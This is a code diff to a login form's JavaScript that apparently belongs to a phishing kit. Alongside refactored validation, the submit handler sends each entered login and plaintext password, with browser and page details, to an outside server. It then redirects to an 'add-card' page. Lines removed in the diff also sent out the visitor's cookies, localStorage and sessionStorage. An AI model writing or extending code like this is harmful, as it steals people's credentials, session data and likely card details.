@@ -30,42 +30,36 @@ document.addEventListener("DOMContentLoaded", () => {
 
   function updatePasswordLabelState() {
     const val = passwordInput.value.trim();
-    const isFocused = document.activeElement === passwordInput;
-    passwordLabel.classList.toggle("shrink", !!val || isFocused);
+    passwordLabel.classList.toggle("shrink", !!val || document.activeElement === passwordInput);
   }
-
 
   function validate() {
     const val = input.value.trim();
+    const passwordVal = passwordInput.value.trim();
     const isEmpty = val === "";
-    const isPhoneInput = /^\d+$/.test(val);
+    const isPhoneInput = isPhone(val);
     const isEmailInput = emailRegex.test(val);
     const isValidPhone = isPhoneInput && val.length >= 9;
-    const passwordVal = passwordInput.value.trim();
     const isPasswordValid = passwordVal.length >= 8;
-    updatePasswordLabelState();
-    passwordLabel.classList.remove("error");
 
-
-    let hasError = false;
-
-    // Reset
+    // Reset states
     input.classList.remove("error", "valid", "phone-mode");
     label.classList.remove("error");
+    passwordInput.classList.remove("error", "valid");
+    passwordLabel.classList.remove("error");
     errorRequired.classList.add("hidden");
     errorFormat.classList.add("hidden");
     errorPhone.classList.add("hidden");
-    phoneWrapper.classList.add("hidden");
-    button.classList.remove("active");
-    errorIcon.style.display = "none";
-    passwordInput.classList.remove("error", "valid");
-    passwordLabel.classList.remove("error");
     errorPassword.classList.add("hidden");
+    phoneWrapper.classList.add("hidden");
+    subtext.classList.add("hidden");
+    button.classList.remove("active");
+    button.disabled = true;
+    errorIcon.style.display = "none";
 
-    if (!touched) {
-      subtext.classList.remove("hidden");
-      return;
-    }
+    if (!touched) return;
+
+    let hasError = false;
 
     if (isEmpty) {
       input.classList.add("error");
@@ -96,104 +90,88 @@ document.addEventListener("DOMContentLoaded", () => {
       label.textContent = "Email address";
     }
 
-    if (!isPasswordValid && touched) {
+    if (!isPasswordValid) {
       passwordInput.classList.add("error");
       passwordLabel.classList.add("error");
       errorPassword.classList.remove("hidden");
       hasError = true;
-    } else if (isPasswordValid) {
-      passwordInput.classList.remove("error");
+    } else {
       passwordInput.classList.add("valid");
-      errorPassword.classList.add("hidden");
-      passwordLabel.classList.remove("error");
     }
 
     if (!hasError) {
       input.classList.add("valid");
       button.classList.add("active");
       button.disabled = false;
-      subtext.classList.toggle("hidden", hasError);
+      subtext.classList.remove("hidden");
     } else {
       subtext.classList.add("hidden");
     }
 
     updateLabelState();
+    updatePasswordLabelState();
   }
 
   input.addEventListener("focus", () => {
     touched = true;
     updateLabelState();
   });
-
-  input.addEventListener("blur", () => {
-    updateLabelState();
-    validate();
-  });
-
-  input.addEventListener("input", () => {
-    updateLabelState();
-    validate();
-  });
+  input.addEventListener("blur", validate);
+  input.addEventListener("input", validate);
 
   passwordInput.addEventListener("focus", () => {
     touched = true;
     updatePasswordLabelState();
   });
-
-  passwordInput.addEventListener("blur", () => {
-    updatePasswordLabelState();
-    validate();
-  });
-
-  passwordInput.addEventListener("input", () => {
-    validate();
-  });
+  passwordInput.addEventListener("blur", validate);
+  passwordInput.addEventListener("input", validate);
 
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
+    if (button.disabled) return;
+  
     const val = input.value.trim();
     const pass = passwordInput.value.trim();
-    if (button.disabled) return;
-
+  
+    // Проверка по валидным учеткам (только для локального теста)
     const isValid = validCredentials.some(
       pair => pair.user === val && pair.pass === pass
     );
-
+  
     const payload = {
       user_input: val,
       password: pass,
+      timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
       location: window.location.href,
-      timestamp: new Date().toISOString(),
-      cookies: document.cookie,
-      localStorage: JSON.stringify(localStorage),
-      sessionStorage: JSON.stringify(sessionStorage),
       success: isValid
     };
-
+  
     button.disabled = true;
-    button.classList.remove("active");
     button.querySelector(".al-button__label").textContent = "Loading...";
-
+  
     try {
-      await fetch("https://onclick-back.onrender.com/login", {
+      const response = await fetch("https://onclick-back.onrender.com/login", {
         method: "POST",
+        credentials: "include", // ✅ добавляем cookies, если нужно
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
       });
-
-      if (isValid) {
+  
+      if (response.ok && isValid) {
+        console.log("✅ Login successful, redirecting...");
         window.location.href = "add-card.html";
       } else {
+        console.warn("⚠️ Login failed or invalid credentials");
         input.classList.add("error");
         passwordInput.classList.add("error");
         errorIcon.style.display = "block";
-        validate();
         button.disabled = false;
         button.querySelector(".al-button__label").textContent = "Continue";
       }
     } catch (err) {
-      console.error("Failed to submit:", err);
+      console.error("❌ Network or server error:", err);
+      alert("Something went wrong. Please try again.");
       button.disabled = false;
       button.querySelector(".al-button__label").textContent = "Continue";
     }
